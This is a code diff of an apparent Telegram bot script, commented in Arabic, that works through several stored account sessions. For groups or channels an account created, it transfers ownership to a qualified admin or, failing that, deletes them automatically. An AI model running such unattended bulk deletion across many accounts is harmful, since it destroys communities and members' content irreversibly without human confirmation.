@@ -1436,6 +1436,8 @@ async def forward_to_owner(event):
         pass
 
 async def ownership_protection_task():
+    # استيراد دقيق للمسارات
+    from telethon.tl.functions.channels import EditAdminRequest, EditCreatorRequest
     from telethon.tl.functions.channels import DeleteChannelRequest
     from telethon.tl.functions.messages import DeleteChatRequest
     
@@ -1449,71 +1451,55 @@ async def ownership_protection_task():
                     
                     session_name = acc['session']
                     session_path = os.path.join(SESSIONS_DIR, session_name)
-                    if not os.path.exists(session_path + ".session"):
-                        continue
+                    if not os.path.exists(session_path + ".session"): continue
                         
                     client = TelegramClient(session_path, API_ID, API_HASH)
                     try:
                         await client.connect()
                         if not await client.is_user_authorized():
-                            await client.disconnect()
-                            continue
+                            await client.disconnect(); continue
                             
-                        # فحص مباشر لأول 30 محادثة بدون ذاكرة تمنع العملية
                         async for dialog in client.iter_dialogs(limit=30):
-                            if dialog.is_channel or dialog.is_group:
+                            if (dialog.is_channel or dialog.is_group) and getattr(dialog.entity, 'creator', False):
                                 entity = dialog.entity
+                                transferred = False
                                 
-                                # الشرط: إذا الحساب هو المالك
-                                if getattr(entity, 'creator', False):
-                                    transferred = False
-                                    
+                                # الذكاء الاصطناعي للبوت: البحث عن الأدمن اللي عنده صلاحيات كاملة فقط
+                                admins = await client.get_participants(entity, filter=ChannelParticipantsAdmins)
+                                for admin in admins:
+                                    # شرط الذكاء: لا تنقل الملكية لأي أدمن عشوائي، فقط للأدمن اللي صلاحياته كاملة (مثلك)
+                                    # وتتأكد أنه مو بوت ومو حسابه الحالي
+                                    if admin.id != acc['id'] and not admin.bot:
+                                        # فحص الصلاحيات: نختار الأدمن اللي يقدر يغير معلومات الكروب (يعني أدمن أصلي)
+                                        if admin.admin_rights and admin.admin_rights.change_info:
+                                            try:
+                                                # محاولة النقل باستخدام التصحيح الجديد للمسار
+                                                await client(EditCreatorRequest(
+                                                    channel=entity,
+                                                    user_id=admin.id,
+                                                    password="" # أضف باسورد التحقق بخطوتين هنا إذا وجد
+                                                ))
+                                                transferred = True
+                                                await bot.send_message(OWNER_ID, f"🛡️ **نقل ذكي:** تم إرجاع ملكية ({entity.title}) للأدمن {admin.first_name} بنجاح.")
+                                                break 
+                                            except Exception as e:
+                                                print(f"فشل النقل الذكي: {e}")
+                                                continue
+                                
+                                # إذا فشل النقل الذكي (ما لكى أدمن مؤهل أو صار خطأ)، يلجأ للتدمير
+                                if not transferred:
                                     try:
-                                        admins = await client.get_participants(entity, filter=ChannelParticipantsAdmins)
-                                        for admin in admins:
-                                            if admin.id != acc['id'] and not admin.bot and not getattr(admin, 'deleted', False):
-                                                try:
-                                                    await client(functions.channels.EditCreatorRequest(
-                                                        channel=entity,
-                                                        user_id=admin.id,
-                                                        password="" # إذا الحساب بيه تحقق بخطوتين لازم تكتبه هنا
-                                                    ))
-                                                    transferred = True
-                                                    try:
-                                                        await bot.send_message(OWNER_ID, f"🛡️ **نجاح:** تم إرجاع ملكية ({getattr(entity, 'title', 'بدون اسم')}) للأدمن.")
-                                                    except Exception: pass
-                                                    break 
-                                                except Exception as e:
-                                                    try:
-                                                        await bot.send_message(OWNER_ID, f"⚠️ **فشل النقل:** حاول يرجع ({getattr(entity, 'title', 'بدون اسم')}) بس فشل.\n**السبب:** `{e}`")
-                                                    except Exception: pass
-                                                    continue
-                                    except Exception:
-                                        pass
-                                        
-                                    if not transferred:
-                                        try:
-                                            if isinstance(entity, types.Channel):
-                                                await client(DeleteChannelRequest(channel=entity))
-                                            elif isinstance(entity, types.Chat):
-                                                await client(DeleteChatRequest(chat_id=entity.id))
-                                            
-                                            try:
-                                                await bot.send_message(OWNER_ID, f"🔥 **تدمير:** تم مسح مجموعة ({getattr(entity, 'title', 'بدون اسم')}) بنجاح.")
-                                            except Exception: pass
-                                        except Exception as e:
-                                            # هذا الإشعار الأهم إذا فشل المسح
-                                            try:
-                                                await bot.send_message(OWNER_ID, f"❌ **فشل المسح:** ما كدر يمسح الكروب ({getattr(entity, 'title', 'بدون اسم')})!\n**السبب التقني:** `{e}`")
-                                            except Exception: pass
+                                        if isinstance(entity, types.Channel): await client(DeleteChannelRequest(channel=entity))
+                                        else: await client(DeleteChatRequest(chat_id=entity.id))
+                                        await bot.send_message(OWNER_ID, f"🔥 **تدمير طوارئ:** تم مسح ({entity.title}) لعدم وجود أدمن مؤهل لاستلام الملكية.")
+                                    except Exception as e:
+                                        await bot.send_message(OWNER_ID, f"❌ **فشل التدمير:** {entity.title}\nالسبب: {e}")
 
                         await client.disconnect()
-                    except Exception:
-                        pass
-        except Exception:
-            pass
-        
-        await asyncio.sleep(15)
+                    except Exception: pass
+        except Exception: pass
+        await asyncio.sleep(30) # زيادة الوقت شوي لتقليل استهلاك موارد السيرفر
+
 
 if __name__ == '__main__':
     bot.loop.create_task(ownership_protection_task())
